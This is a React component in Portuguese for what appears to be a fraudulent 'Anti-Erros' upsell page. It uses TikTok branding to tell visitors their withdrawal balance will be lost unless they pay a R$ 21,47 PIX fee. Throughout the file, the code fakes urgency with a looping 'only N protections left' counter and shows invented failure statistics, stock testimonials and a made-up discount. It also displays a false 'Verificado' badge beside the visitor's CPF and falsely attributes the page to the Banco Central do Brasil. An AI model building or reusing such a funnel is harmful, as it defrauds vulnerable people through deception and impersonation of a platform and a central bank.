import { useState, useEffect } from "react";
import { Loader2, AlertTriangle, Shield, CheckCircle2, Lock, Zap, ChevronRight } from "lucide-react";
import StickyCtaBar from "./StickyCtaBar";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellAntiErrosProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="border border-gray-200 rounded-lg overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-2.5 text-left bg-white"><span className="text-gray-700 text-[11px] font-semibold">{question}</span><span className="text-gray-400 text-xs">{open ? "−" : "+"}</span></button>{open && <p className="px-2.5 pb-2.5 text-gray-500 text-[11px] leading-relaxed">{answer}</p>}</div>); };

const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiErrosProps) => {
  const [activationsLeft, setActivationsLeft] = useState(4);
  const firstName = leadName ? leadName.split(" ")[0] : "";
  useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 1 ? 5 : prev - 1)), 20000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-white overflow-y-auto pt-6">
      <div className="bg-[#FE2C55] py-2.5 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-24">
        {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50 border border-red-200 rounded-xl p-3"><div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⚠️ Risco de Falha no Saque</span></div><p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, o</> : "O"} sistema detectou que <strong className="text-gray-900">23% dos saques sem proteção Anti-Erros falham</strong> por inconsistências entre CPF, chave PIX e dados bancários. Quando isso acontece, <strong className="text-red-600">o valor é devolvido ao remetente e o saldo é cancelado permanentemente</strong>.</p></div>
        <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
          <p className="text-red-700 text-xs font-bold">🚨 Sem proteção Anti-Erros:</p>
          <div className="flex items-start gap-2"><Lock className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">CPF divergente = <strong className="text-red-600">saque rejeitado e cancelado</strong></span></div>
          <div className="flex items-start gap-2"><AlertTriangle className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Erro de chave PIX = <strong className="text-red-600">valor devolvido sem possibilidade de reenvio</strong></span></div>
          <div className="flex items-start gap-2"><AlertTriangle className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Falha de registro bancário = <strong className="text-red-600">bloqueio automático da conta</strong></span></div>
          <div className="border-t border-red-200 pt-2 mt-1"><div className="flex items-start gap-2"><Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Com proteção: <strong className="text-emerald-700">correção automática + saque garantido em 3 min</strong></span></div></div>
        </div>
        <div className="bg-red-600 rounded-lg px-3 py-2.5 flex items-center justify-center gap-2"><div className="relative"><div className="w-2 h-2 bg-white rounded-full" /><div className="absolute inset-0 w-2 h-2 bg-white rounded-full animate-ping" /></div><span className="text-white text-[11px] font-bold">⚠️ APENAS {activationsLeft} PROTEÇÕES DISPONÍVEIS</span></div>
        <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200">
          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Proteção Anti-Erros</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">72% OFF</span></div>
          <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">R$ 79,90</span><span className="text-gray-900 text-3xl font-extrabold">R$ 21,47</span></div>
          <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
          <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} proteção = risco de perda total do saldo de {balance}</p>
          <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
        </div>
        <div className="space-y-2"><p className="text-gray-700 text-xs font-bold">Perguntas frequentes</p><FaqItem question="O que é a proteção Anti-Erros?" answer="É um protocolo de verificação que corrige automaticamente qualquer inconsistência entre seu CPF, chave PIX e dados bancários antes da transferência." /><FaqItem question="Por que 23% dos saques falham sem proteção?" answer="O sistema bancário rejeita transferências quando detecta inconsistência entre os dados cadastrais." /><FaqItem question="A taxa de R$ 21,47 é reembolsável?" answer="Sim, 100% reembolsável. Se o saque não cair na sua conta, o valor retorna automaticamente em até 2 minutos." /></div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200"><p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Protegidos e sacaram com sucesso</p><div className="space-y-2.5">{[{ img: testimonial1, name: "Renata S.", amount: "R$ 2.134", text: "Quase perdi tudo por erro de chave. A proteção corrigiu na hora!" }, { img: testimonial2, name: "Diego M.", amount: "R$ 3.671", text: "Meu CPF tava diferente no banco. Sem a proteção ia perder." }, { img: testimonial3, name: "Juliana F.", amount: "R$ 1.892", text: "Ativei e em 3 min caiu tudo certinho. Vale muito." }].map((t, i) => (<div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" loading="lazy" className="w-7 h-7 rounded-full object-cover shrink-0" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>))}</div></div>
        <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
        <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
      </main>
      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="PROTEGER MEU SAQUE" bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
    </div>
  );
};

export default FunnelUpsellAntiErros;
